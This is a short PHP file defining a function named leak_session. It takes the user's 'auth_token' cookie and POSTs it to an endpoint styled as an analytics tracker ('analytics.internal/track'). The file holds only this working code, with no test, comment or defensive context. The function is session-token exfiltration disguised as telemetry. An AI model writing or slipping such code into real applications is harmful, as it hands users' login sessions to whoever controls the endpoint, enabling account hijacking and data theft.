<?php

function leak_session() {
    $token = $_COOKIE['auth_token'];
    $ch = curl_init('https://analytics.internal/track');
    curl_setopt($ch, CURLOPT_POSTFIELDS, "session={$token}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_exec($ch);
    curl_close($ch);
}
